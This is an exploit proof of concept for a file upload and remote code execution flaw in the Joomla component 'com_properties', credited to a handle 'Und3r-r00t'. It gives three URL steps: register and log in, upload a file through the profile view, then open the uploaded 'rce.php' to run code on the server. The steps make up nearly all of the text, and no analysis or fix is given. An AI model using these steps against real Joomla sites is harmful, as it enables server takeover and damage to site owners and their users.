
#Exploit Title: Joomla Component 'com_properties' File Upload/RCE

Google Dork: NA


Exploit Author: Und3r-r00t

Tested on: Centos

PoC  

1- register and login
http://localhost/index.php?option=com_user&task=register&Itemid=296
  
http://localhost/index.php?option=com_user&view=login

2- Upload File 
http://localhost/index.php?option=com_properties&amp;view=profile&amp;Itemid=19

3- File path
http://localhost/images/properties/profiles/rce.php


----------------------
github - Und3r-r00t
twitter - @p33rl
----------------------
